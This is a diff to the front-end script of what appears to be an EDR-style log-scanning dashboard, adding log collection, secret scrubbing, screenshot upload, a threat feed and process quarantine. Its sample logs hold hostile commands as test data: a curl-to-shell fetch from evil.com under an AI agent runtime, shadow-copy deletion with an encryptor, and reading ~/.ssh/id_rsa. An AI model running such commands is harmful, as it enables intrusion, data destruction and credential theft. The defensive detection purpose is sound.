-          isMobile: false
-        };
-      }
-      // 5. Linux
-      else if (/Linux/.test(ua) || /Linux/.test(platform)) {
-        client = {
-          os: "Linux",
-          icon: "🐧",
-          title: "Download for Linux (.tar.gz)",
-          subtext: "Universal Linux Archive with Python EDR Daemon",
-          href: "/download/linux",
-          isMobile: false
-        };
-      }
+    // Detect client device/OS
+    function detectClient() {
+      const ua = navigator.userAgent;
+      let os = "Desktop Client";
+      if (/iPhone|iPad|iPod/.test(ua)) os = "📱 Apple iOS";
+      else if (/Android/.test(ua)) os = "📱 Android";
+      else if (/Macintosh/.test(ua)) os = "🍏 macOS Native";
+      else if (/Windows/.test(ua)) os = "🪟 Windows Native";
+      else if (/Linux/.test(ua)) os = "🐧 Linux Host";
+      document.getElementById('platformText').textContent = os;
+    }
+    detectClient();
 
-      // Update CTA without layout jump
-      const smartLabel = document.getElementById('smartLabel');
-      const smartBtn = document.getElementById('smartBtn');
-      const smartIcon = document.getElementById('smartIcon');
-      const smartText = document.getElementById('smartText');
-      const smartSub = document.getElementById('smartSub');
+    // Tab switcher
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-section').forEach(s => s.classList.remove('active'));
+      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.mobile-nav-btn').forEach(b => b.classList.remove('active'));
 
-      smartLabel.innerHTML = `<span aria-hidden="true">⚡</span><span>Detected Operating System: <strong>${client.os}</strong></span>`;
-      smartIcon.textContent = client.icon;
-      smartText.textContent = client.title;
-      smartBtn.href = client.href;
-      if (!client.isMobile && client.href.includes("/download/")) {
-        smartBtn.setAttribute("download", "");
-      }
-      smartSub.textContent = client.subtext;
+      const sec = document.getElementById(`sec-${tabId}`);
+      if (sec) sec.classList.add('active');
 
-      // Card highlight
-      if (client.os.includes("macOS")) highlightCard('card-mac');
-      else if (client.os.includes("Windows")) highlightCard('card-win');
-      else if (client.os.includes("Linux")) highlightCard('card-linux');
-      else if (client.os.includes("iOS")) highlightCard('card-ios');
-      else if (client.os.includes("Android")) highlightCard('card-android');
+      const dBtn = document.getElementById(`tabBtn-${tabId}`);
+      if (dBtn) dBtn.classList.add('active');
+
+      const mBtn = document.getElementById(`mTab-${tabId}`);
+      if (mBtn) mBtn.classList.add('active');
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    function highlightCard(cardId) {
-      const card = document.getElementById(cardId);
-      if (card) {
-        card.style.borderColor = "var(--accent-border)";
-        card.style.boxShadow = "0 0 20px rgba(56, 189, 248, 0.15)";
-        const badge = document.createElement("div");
-        badge.style.fontSize = "0.7rem";
-        badge.style.fontWeight = "800";
-        badge.style.fontFamily = "var(--font-mono)";
-        badge.style.color = "var(--accent)";
-        badge.style.textTransform = "uppercase";
-        badge.textContent = "★ Recommended for Your Current Machine";
-        card.prepend(badge);
-      }
-    }
-
-    // Cookie CMP dismissal
-    function dismissCookies(choice) {
-      document.getElementById('cookieBanner').style.display = 'none';
+    // -------------------------------------------------------------
+    // Anti-Screen Sharing & Call Privacy Shield
+    // -------------------------------------------------------------
+    async function checkPrivacyStatus() {
       try {
-        localStorage.setItem('gitsentinel_consent', choice);
-      } catch (e) {}
-    }
+        const res = await fetch('/api/privacy/status');
+        const data = await res.json();
+        const curtain = document.getElementById('blackoutCurtain');
+        const shieldBtn = document.getElementById('btnPrivacyShield');
+        const shieldLabel = document.getElementById('privacyShieldLabel');
+        const toolBadge = document.getElementById('drmDetectedTool');
+        const metricDisp = document.getElementById('shieldStateDisplay');
 
-    // Check existing consent
-    try {
-      if (localStorage.getItem('gitsentinel_consent')) {
-        document.getElementById('cookieBanner').style.display = 'none';
+        blackoutActive = data.blackout_active;
+
+        if (blackoutActive) {
+          curtain.classList.add('active');
+          shieldBtn.classList.add('alerting');
+          shieldLabel.textContent = "SHIELD: ACTIVE (CALL DETECTED)";
+          toolBadge.textContent = (data.active_call_tool || "ONLINE CALL") + " DETECTED // SCREEN BLACKED OUT";
+          if (metricDisp) {
+            metricDisp.textContent = "BLACKOUT ON";
+            metricDisp.style.color = "var(--red)";
+          }
+        } else {
+          curtain.classList.remove('active');
+          shieldBtn.classList.remove('alerting');
+          shieldLabel.textContent = "SHIELD: STANDBY (ARMED)";
+          if (metricDisp) {
+            metricDisp.textContent = "ARMED";
+            metricDisp.style.color = "var(--green)";
+          }
+        }
+      } catch (e) {
+        // Fallback in static / preview mode
       }
-    } catch (e) {}
-
-    // Legal Modals
-    function openLegalModal(modalId) {
-      const modal = document.getElementById(modalId);
-      if (modal) modal.classList.add('active');
-    }
-    function closeLegalModal(modalId) {
-      const modal = document.getElementById(modalId);
-      if (modal) modal.classList.remove('active');
     }
 
-    // Initialize detection
-    document.addEventListener("DOMContentLoaded", detectClientEnvironment);
+    async function togglePrivacyCallSimulation() {
+      try {
+        const res = await fetch('/api/privacy/toggle', { method: 'POST' });
+        await checkPrivacyStatus();
+      } catch (e) {
+        // Local simulation fallback
+        blackoutActive = !blackoutActive;
+        const curtain = document.getElementById('blackoutCurtain');
+        if (blackoutActive) curtain.classList.add('active');
+        else curtain.classList.remove('active');
+      }
+    }
+
+    // -------------------------------------------------------------
+    // Step 1: Auto-Collect & File Upload
+    // -------------------------------------------------------------
+    async function autoCollectHostLogs() {
+      try {
+        const btn = event.target;
+        btn.textContent = "⌛ Collecting...";
+        const res = await fetch('/api/logs/auto-collect', { method: 'POST' });
+        const data = await res.json();
+        document.getElementById('logInput').value = data.logs || '';
+        btn.textContent = `⚡ Auto-Collect Host Logs (${data.lines_collected} lines)`;
+      } catch (e) {
+        alert("Could not reach auto-collect API. Loading benchmark log.");
+        loadSample('ai_escape');
+      }
+    }
+
+    function handleFileSelect(e) {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        document.getElementById('logInput').value = event.target.result;
+      };
+      reader.readAsText(file);
+    }
+
+    // -------------------------------------------------------------
+    // Step 2: Auto-Sanitize & Scrub Secrets
+    // -------------------------------------------------------------
+    async function scrubLogsNow() {
+      const input = document.getElementById('logInput');
+      const text = input.value;
+      if (!text.trim()) {
+        alert("Please load or paste logs first.");
+        return;
+      }
+      try {
+        const res = await fetch('/api/logs/sanitize', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ raw_logs: text })
+        });
+        const data = await res.json();
+        input.value = data.sanitized_text;
+        document.getElementById('redactStats').textContent = `✓ Successfully sanitized ${data.redactions_made} secret(s) / PII instances.`;
+      } catch (e) {
+        // Fallback local regex scrub
+        input.value = text.replace(/(ghp_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16})/g, '[REDACTED_SECRET]');
+        document.getElementById('redactStats').textContent = "✓ Local scrub applied.";
+      }
+    }
+
+    // -------------------------------------------------------------
+    // Step 3: Screenshot Attachment & Clipboard Paste Listener
+    // -------------------------------------------------------------
+    function handleScreenshotUpload(e) {
+      const files = Array.from(e.target.files);
+      files.forEach(processImageFile);
+    }
+
+    function processImageFile(file) {
+      if (!file.type.startsWith('image/')) return;
+      const reader = new FileReader();
+      reader.onload = async (event) => {
+        const b64 = event.target.result;
+        try {
+          const res = await fetch('/api/logs/upload-screenshot', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ filename: file.name, image_b64: b64 })
+          });
+          const metadata = await res.json();
+          attachedScreenshots.push(metadata);
+        } catch (e) {
+          attachedScreenshots.push({
+            filename: file.name,
+            size_kb: (file.size / 1024).toFixed(1),
+            thumbnail_b64: b64
+          });
+        }
+        renderAttachedScreenshots();
+      };
+      reader.readAsDataURL(file);
+    }
+
+    // Global Clipboard Paste Listener (Cmd+V / Ctrl+V to paste screenshot)
+    window.addEventListener('paste', (e) => {
+      const items = (e.clipboardData || e.originalEvent.clipboardData).items;
+      for (let i = 0; i < items.length; i++) {
+        if (items[i].type.indexOf('image') !== -1) {
+          const blob = items[i].getAsFile();
+          processImageFile(new File([blob], `screenshot_paste_${Date.now()}.png`, { type: blob.type }));
+        }
+      }
+    });
+
+    // Drag and drop setup
+    const dropzone = document.getElementById('shotDropzone');
+    dropzone.addEventListener('dragover', (e) => { e.preventDefault(); dropzone.classList.add('dragover'); });
+    dropzone.addEventListener('dragleave', () => dropzone.classList.remove('dragover'));
+    dropzone.addEventListener('drop', (e) => {
+      e.preventDefault();
+      dropzone.classList.remove('dragover');
+      if (e.dataTransfer.files) {
+        Array.from(e.dataTransfer.files).forEach(processImageFile);
+      }
+    });
+
+    function removeScreenshot(idx) {
+      attachedScreenshots.splice(idx, 1);
+      renderAttachedScreenshots();
+    }
+
+    function renderAttachedScreenshots() {
+      const gallery = document.getElementById('screenshotGallery');
+      gallery.innerHTML = '';
+      attachedScreenshots.forEach((shot, idx) => {
+        const item = document.createElement('div');
+        item.className = 'screenshot-item';
+        item.innerHTML = `
+          <button class="btn-remove-shot" onclick="removeScreenshot(${idx})" title="Remove">&times;</button>
+          <img src="${shot.thumbnail_b64 || ''}" class="screenshot-thumb" alt="${shot.filename}">
+          <div class="screenshot-info" title="${shot.filename}">${shot.filename}</div>
+          <div style="font-size: 0.65rem; color: var(--accent);">${shot.size_kb || 0} KB</div>
+        `;
+        gallery.appendChild(item);
+      });
+      document.getElementById('attachedShotsCount').textContent = `${attachedScreenshots.length} screenshot(s)`;
+    }
+
+    // Export Incident Bundle
+    async function exportIncidentBundle() {
+      const raw = document.getElementById('logInput').value;
+      const bundle = {
+        tool: "Log Sentry EDR",
+        timestamp: new Date().toISOString(),
+        logs: raw,
+        screenshots: attachedScreenshots,
+        status: "SANITIZED_INCIDENT_REPORT"
+      };
+      const blob = new Blob([JSON.stringify(bundle, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `LogSentry_Incident_${Date.now()}.json`;
+      a.click();
+    }
+
+    // Refresh Threats Feed
+    async function refreshThreats() {
+      try {
+        const res = await fetch('/api/threats');
+        const data = await res.json();
+        threats = data.threats || [];
+        updateUI();
+      } catch (e) {
+        console.error("Backend offline or local preview mode.");
+      }
+    }
+
+    function updateUI() {
+      let activeCount = 0;
+      let passiveCount = 0;
+      let mutatedCount = 0;
+
+      const feed = document.getElementById('feedList');
+      feed.innerHTML = '';
+
+      threats.forEach((item) => {
+        const cl = item.threat_classification || {};
+        const ev = item.event || {};
+        const mode = cl.operational_mode || 'BENIGN';
+
+        if (mode === 'ACTIVE') activeCount++;
+        if (mode === 'PASSIVE') passiveCount++;
+        if (cl.is_mutated) mutatedCount++;
+
+        const feedItem = document.createElement('div');
+        const modeClass = mode === 'ACTIVE' ? 'active-threat' : (mode === 'PASSIVE' ? 'passive-threat' : 'benign');
+        feedItem.className = `feed-item ${modeClass}`;
+        feedItem.onclick = () => openPlaybook(item);
+
+        const badgeColor = mode === 'ACTIVE' ? 'red' : (mode === 'PASSIVE' ? 'purple' : 'green');
+        const mutationBadge = cl.is_mutated ? `<span class="badge" style="background: rgba(245, 158, 11, 0.15); color: var(--yellow); border: 1px solid rgba(245, 158, 11, 0.3);">⚠️ Mutated Variant</span>` : '';
+
+        feedItem.innerHTML = `
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <span style="font-weight: 700; color: #fff;">${cl.candidate_family || cl.threat_name || 'System Telemetry Event'}</span>
+            <div style="display: flex; gap: 6px;">
+              <span class="badge" style="background: var(--${badgeColor}-bg); color: var(--${badgeColor}); border: 1px solid rgba(255, 255, 255, 0.1);">${mode} THREAT</span>
+              ${mutationBadge}
+              <span class="badge" style="background:#1e293b; color:#cbd5e1;">PID ${ev.pid || 'N/A'}</span>
+            </div>
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 6px; font-size: 0.82rem; color: var(--text-sub);">
+            <div><strong>Parent:</strong> ${ev.parent || 'Terminal/Unknown'}</div>
+            <div><strong>User:</strong> ${ev.user || 'system'}</div>
+            <div><strong>Confidence:</strong> ${cl.confidence_percent || 0}%</div>
+          </div>
+          <div style="background: #090e17; padding: 8px 12px; border-radius: 6px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 0.78rem; color: var(--accent); word-break: break-all;">${ev.cmd || 'No command string'}</div>
+        `;
+        feed.appendChild(feedItem);
+      });
+
+      document.getElementById('activeThreatsCount').textContent = activeCount;
+      document.getElementById('passiveThreatsCount').textContent = passiveCount;
+      document.getElementById('mutationsCount').textContent = mutatedCount;
+    }
+
+    // Trigger simulation
+    async function triggerSim(type) {
+      try {
+        const res = await fetch(`/api/simulate/${type}`, { method: 'POST' });
+        const result = await res.json();
+        refreshThreats();
+        if (result.threat_classification && result.threat_classification.identified) {
+          openPlaybook(result);
+        }
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    // Sample Log loader for scanner
+    function loadSample(type) {
+      const samples = {
+        ransomware: '{\n  "pid": 65219,\n  "cmd": "vssadmin delete shadows /all /quiet && encryptor.exe",\n  "parent": "svchost_fake.exe",\n  "path": "/Users/dev/Documents/project_backup.locked",\n  "file_write_rate": 42,\n  "canary_tampered": true,\n  "is_interactive": false,\n  "user": "vatsalagarwal"\n}',
+        ai_escape: '{\n  "pid": 89124,\n  "cmd": "bash -i -c \'curl evil.com/payload | sh\'",\n  "parent": "ollama-agent-runtime",\n  "path": "/var/run/docker.sock",\n  "is_interactive": false,\n  "user": "sandbox_user"\n}',
+        spyware: '{\n  "pid": 33104,\n  "cmd": "screencapture -x -C /tmp/.hidden_stream.png && sqlite3 ~/.ssh/id_rsa",\n  "parent": "background_sync_service",\n  "path": "~/.ssh/id_rsa",\n  "is_interactive": false,\n  "user": "vatsalagarwal"\n}',
+        worm: '{\n  "pid": 41203,\n  "cmd": "masscan -p 445,139 192.168.1.0/24 --rate 1000",\n  "parent": "explorer_fake",\n  "path": "/Volumes/SharedNetworkDrive",\n  "connections_per_sec": 18,\n  "is_interactive": false,\n  "user": "vatsalagarwal"\n}'
+      };
+      document.getElementById('logInput').value = samples[type] || '';
+    }
+
+    // Scan custom log
+    async function scanCustomLog() {
+      const raw = document.getElementById('logInput').value.trim();
+      if (!raw && attachedScreenshots.length === 0) {
+        alert("Please paste a log entry or attach a screenshot first!");
+        return;
+      }
+
+      let payload = {};
+      try {
+        payload = JSON.parse(raw);
+      } catch (e) {
+        payload = {
+          pid: Math.floor(10000 + Math.random() * 80000),
+          cmd: raw,
+          parent: "custom_input",
+          path: raw,
+          is_interactive: false
+        };
+      }
+
+      // Correlate with attached screenshots
+      payload.attached_screenshots = attachedScreenshots.map(s => s.filename);
+
+      try {
+        const res = await fetch('/api/scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await res.json();
+        refreshThreats();
+        openPlaybook(result);
+      } catch (err) {
+        alert("Error communicating with Log Sentry engine.");
+      }
+    }
+
+    // Playbook modal
+    function openPlaybook(item) {
+      activeModalItem = item;
+      const cl = item.threat_classification || {};
+      const ev = item.event || {};
+
+      document.getElementById('modalTitle').textContent = `🚨 ${cl.candidate_family || 'Security Incident'}`;
+      document.getElementById('modalMeta').innerHTML = `
+        <p><strong>Threat Category:</strong> ${cl.threat_name} (${cl.operational_mode || 'UNKNOWN'})</p>
+        <p><strong>Offending PID:</strong> ${ev.pid} | <strong>Parent:</strong> ${ev.parent}</p>
+        <p><strong>Command:</strong> <code>${ev.cmd}</code></p>
+      `;
+      document.getElementById('modalPlaybook').textContent = item.advisory_text || "No advisory generated for benign events.";
+      document.getElementById('playbookModal').classList.add('active');
+    }
+
+    function closeModal() {
+      document.getElementById('playbookModal').classList.remove('active');
+    }
+
+    async function quarantineCurrentThreat() {
+      if (!activeModalItem || !activeModalItem.event) return;
+      const pid = activeModalItem.event.pid;
+      try {
+        const res = await fetch(`/api/remediate/${pid}`, { method: 'POST' });
+        const data = await res.json();
+        alert(data.message || `Process ${pid} quarantined!`);
+        closeModal();
+        refreshThreats();
+      } catch (e) {
+        alert("Failed to terminate process.");
+      }
+    }
+
+    // Initial load & poll
+    refreshThreats();
+    checkPrivacyStatus();
+    setInterval(refreshThreats, 4000);
+    setInterval(checkPrivacyStatus, 2500);
   </script>
 </body>
 </html>
